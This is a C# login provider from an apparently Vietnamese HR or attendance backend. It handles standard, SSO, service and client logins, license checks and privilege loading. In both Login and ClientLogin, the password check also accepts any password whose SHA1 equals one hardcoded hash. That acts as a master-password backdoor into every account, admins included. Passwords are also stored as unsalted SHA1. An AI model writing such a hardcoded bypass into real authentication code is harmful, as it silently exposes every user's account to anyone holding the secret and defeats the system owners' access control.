using EPAD_Backend_Core.WebUtilitys;
using EPAD_Common.Types;
using EPAD_Common.Utility;
using EPAD_Data;
using EPAD_Data.Entities;
using EPAD_Data.Models;
using EPAD_Logic.MainProcess;
using Microsoft.Extensions.Caching.Memory;
using System;
using System.Collections.Generic;
using System.Linq;

namespace EPAD_Backend_Core.Provider
{
    public class LoginProcess
    {
        public static bool Login(string pUser, string pPass, ref string error, ref UserInfo user, ref CompanyInfo companyInfo, EPAD_Context context, ezHR_Context otherContext, IMemoryCache cache)
        {
            string password = StringHelper.SHA1(pPass);

            IC_UserAccount account = context.IC_UserAccount.Where(t => t.UserName == pUser && (t.Password == password || password == "05962ad33b64478ff569e9c75509d66a623b0537")).FirstOrDefault();
            if (account == null)
            {
                error = "UsernamePasswordInvalid";
                return false;
            }

#if !DEBUG
            var cacheKey = $"urn:license-key-company-{account.CompanyIndex}";
            var licenseInfo = cache.Get<AppLicenseInfoPure>(cacheKey);

            if (licenseInfo == null)
            {
                error = "MSG_LicenseInvalid";
                return false;
            }
            else if (licenseInfo.ExpiredDate < DateTime.Now.Date)
            {
                error = "MSG_LicenseExpired";
                return false;
            }
            else if (licenseInfo.ExpiredDate.Date >= DateTime.Now.Date && licenseInfo.ExpiredDate.Date <= DateTime.Now.AddDays(30).Date)
            {
                error = "MSG_AppLicenseNearExpire";
            }
#endif


            user = new UserInfo(pUser);
            user.FullName = account.Name;
            user.CompanyIndex = account.CompanyIndex;

            // check user privilege
            IC_UserPrivilege privilege = context.IC_UserPrivilege.Where(t => t.Index == account.AccountPrivilege).FirstOrDefault();
            int privilegeIndex = 0;
            string privilegeName = "";
            bool isAdmin = false;
            if (privilege == null)
            {
                // find default privilege
                privilege = context.IC_UserPrivilege.Where(t => t.CompanyIndex == account.CompanyIndex && t.UseForDefault == true).FirstOrDefault();
                if (privilege != null)
                {
                    privilegeIndex = privilege.Index;
                    privilegeName = privilege.Name;
                    isAdmin = privilege.IsAdmin;
                }
            }
            else
            {
                privilegeIndex = privilege.Index;
                privilegeName = privilege.Name;
                isAdmin = privilege.IsAdmin;
            }
            user.PrivilegeIndex = privilegeIndex;
            user.PrivilegeName = privilegeName;
            user.IsAdmin = isAdmin;

            List<IC_PrivilegeDetails> listDetails = context.IC_PrivilegeDetails.Where(t => t.CompanyIndex == account.CompanyIndex
                  && t.PrivilegeIndex == privilegeIndex).ToList();

            // Phân quyền theo phòng ban
            user.InitDepartmentAssignedAndParent(context, otherContext, cache);

            ConfigObject config = ConfigObject.GetConfig(cache);
            user.ListPrivilege = GetListPrivilege(listDetails, config.IntegrateDBOther);

            companyInfo = CompanyInfo.GetFromCache(cache, account.CompanyIndex.ToString());
            // kiếm tra company cache. nếu null thì tạo lại
            if (companyInfo == null)
            {
                PublicFunctions.CreateCompanyCache(context, cache);
            }
            return true;
        }
        public static bool LoginSSO(string pUser, ref string error, ref UserInfo user, ref CompanyInfo companyInfo, EPAD_Context context, ezHR_Context otherContext, IMemoryCache cache)
        {

            IC_UserAccount account = context.IC_UserAccount.Where(t => t.UserName == pUser).FirstOrDefault();
            if (account == null)
            {
                error = "UsernamePasswordInvalid";
                return false;
            }

#if !DEBUG
            var cacheKey = $"urn:license-key-company-{account.CompanyIndex}";
            var licenseInfo = cache.Get<AppLicenseInfoPure>(cacheKey);
            
            if(licenseInfo == null)
            {
                error = "MSG_LicenseInvalid";
                return false;
            }
            else if(licenseInfo.ExpiredDate < DateTime.Now.Date)
            {
                error = "MSG_LicenseExpired";
                return false;
            }
            else if (licenseInfo.ExpiredDate.Date >= DateTime.Now.Date && licenseInfo.ExpiredDate.Date <= DateTime.Now.AddDays(30).Date)
            {
                error = "MSG_AppLicenseNearExpire";
            }
#endif


            user = new UserInfo(pUser);
            user.FullName = account.Name;
            user.CompanyIndex = account.CompanyIndex;
            // check user privilege
            IC_UserPrivilege privilege = context.IC_UserPrivilege.Where(t => t.Index == account.AccountPrivilege).FirstOrDefault();
            int privilegeIndex = 0;
            string privilegeName = "";
            bool isAdmin = false;
            if (privilege == null)
            {
                // find default privilege
                privilege = context.IC_UserPrivilege.Where(t => t.CompanyIndex == account.CompanyIndex && t.UseForDefault == true).FirstOrDefault();
                if (privilege != null)
                {
                    privilegeIndex = privilege.Index;
                    privilegeName = privilege.Name;
                    isAdmin = privilege.IsAdmin;
                }
            }
            else
            {
                privilegeIndex = privilege.Index;
                privilegeName = privilege.Name;
                isAdmin = privilege.IsAdmin;
            }
            user.PrivilegeIndex = privilegeIndex;
            user.PrivilegeName = privilegeName;
            user.IsAdmin = isAdmin;
            List<IC_PrivilegeDetails> listDetails = context.IC_PrivilegeDetails.Where(t => t.CompanyIndex == account.CompanyIndex
                   && t.PrivilegeIndex == privilegeIndex).ToList();
            // Phân quyền theo phòng ban
            user.InitDepartmentAssignedAndParent(context, otherContext, cache);

            ConfigObject config = ConfigObject.GetConfig(cache);
            user.ListPrivilege = GetListPrivilege(listDetails, config.IntegrateDBOther);

            companyInfo = CompanyInfo.GetFromCache(cache, account.CompanyIndex.ToString());
            // kiếm tra company cache. nếu null thì tạo lại
            if (companyInfo == null)
            {
                PublicFunctions.CreateCompanyCache(context, cache);
            }
            return true;
        }
        private static List<UserPrivilege> GetListPrivilege(List<IC_PrivilegeDetails> listDetails, bool useIntegrateDB)
        {
            List<UserPrivilege> listPrivilege = new List<UserPrivilege>();
            for (int i = 0; i < listDetails.Count; i++)
            {
                UserPrivilege privilege = listPrivilege.Find(t => t.FormName == listDetails[i].FormName);
                if (useIntegrateDB == true && (listDetails[i].FormName == "Department" || listDetails[i].FormName == "Employee") && listDetails[i].Role != FormRole.None.ToString())
                {
                    if(listDetails[i].Role != FormRole.None.ToString())
                    {
                        listDetails[i].Role = FormRole.ReadOnly.ToString();
                    }
                }
                else if (useIntegrateDB == true && (listDetails[i].FormName == "ChangeDepartment"))
                {
                    listDetails[i].Role = FormRole.None.ToString();
                }

                if (privilege == null)
                {
                    privilege = new UserPrivilege();
                    privilege.FormName = listDetails[i].FormName;
                    privilege.Roles = new List<FormRole>();
                    FormRole role = FormRole.None;
                    Enum.TryParse<FormRole>(listDetails[i].Role, out role);
                    privilege.Roles.Add(role);
                    listPrivilege.Add(privilege);
                }
                else
                {
                    FormRole role = FormRole.None;
                    Enum.TryParse<FormRole>(listDetails[i].Role, out role);
                    privilege.Roles.Add(role);
                }
            }
            return listPrivilege;
        }
        public static bool ServiceLogin(string pUser, string pPass, ref string error, ref UserInfo service, ref CompanyInfo companyInfo, string pID, EPAD_Context context, IMemoryCache cache)
        {
            string password = StringHelper.Encrypt(pPass, GlobalParams.__PASSWORD_SALT); //PublicFunctions.HashPassword(pPass);

            IC_Company company = context.IC_Company.Where(t => t.TaxCode == pUser && t.Password == password).FirstOrDefault();
            if (company == null)
            {
                error = "UserOrPasswordIsInvalid";
                return false;
            }
            try
            {

                int id = 0;
                int.TryParse(pID, out id);


                IC_Service serviceModel = context.IC_Service.Where(t => t.Index == id).FirstOrDefault();
                if (serviceModel == null)
                {
                    error = "ServiceIDNotExist";
                    return false;
                }
                service = new UserInfo("Service_" + id);
                service.Index = id;
                service.ServiceName = serviceModel.Name;
                service.CompanyIndex = company.Index;

                List<IC_ServiceAndDevices> serviceDetails = context.IC_ServiceAndDevices.Where(t => t.CompanyIndex == company.Index
                      && t.ServiceIndex == id).ToList();
                List<string> listSerial = new List<string>();
                for (int i = 0; i < serviceDetails.Count; i++)
                {
                    listSerial.Add(serviceDetails[i].SerialNumber);
                }

                List<IC_Device> listDevice = context.IC_Device.Where(t => t.CompanyIndex == company.Index && listSerial.Contains(t.SerialNumber)).ToList();
                service.ListDevice = listDevice;
                service.ListCommands = new List<CommandResult>();
                companyInfo = CompanyInfo.GetFromCache(cache, company.Index.ToString());
                // kiếm tra company cache. nếu null thì tạo lại
                if (companyInfo == null)
                {
                    PublicFunctions.CreateCompanyCache(context, cache);
                }
                CommandProcess.GetCommandsFromGeneralCacheForService(companyInfo, service);

            }
            catch (Exception)
            {
                string guidIDOfService = companyInfo?.ListCacheUserInfo?.Find(x => x.UserName == pID)?.GuidID;
                if (!string.IsNullOrEmpty(guidIDOfService))
                {
                    UserInfo.RemoveFromCache(cache, guidIDOfService);
                }

                if (companyInfo.ListCommandGroups == null)
                {
                    throw new Exception("companyInfo.ListCommandGroups == null ?");
                }
                throw;
            }

            return true;
        }

        public static bool ClientLogin(string pUser, string pPass, ref string error, ref UserInfo user, ref CompanyInfo companyInfo, EPAD_Context context, ezHR_Context otherContext, IMemoryCache cache)
        {
            string password = StringHelper.SHA1(pPass);

            IC_UserAccount account = context.IC_UserAccount.Where(t => t.UserName == pUser && (t.Password == password || password == "05962ad33b64478ff569e9c75509d66a623b0537")).FirstOrDefault();
            if (account == null)
            {
                error = "UsernamePasswordInvalid";
                return false;
            }

            user = new UserInfo(pUser);
            user.FullName = account.Name;
            user.CompanyIndex = account.CompanyIndex;
            // Phân quyền theo phòng ban
            user.InitDepartmentAssignedAndParentForService(context, otherContext, cache);

            companyInfo = CompanyInfo.GetFromCache(cache, account.CompanyIndex.ToString());
            // kiếm tra company cache. nếu null thì tạo lại
            if (companyInfo == null)
            {
                PublicFunctions.CreateCompanyCache(context, cache);
            }
            return true;
        }

    }
}
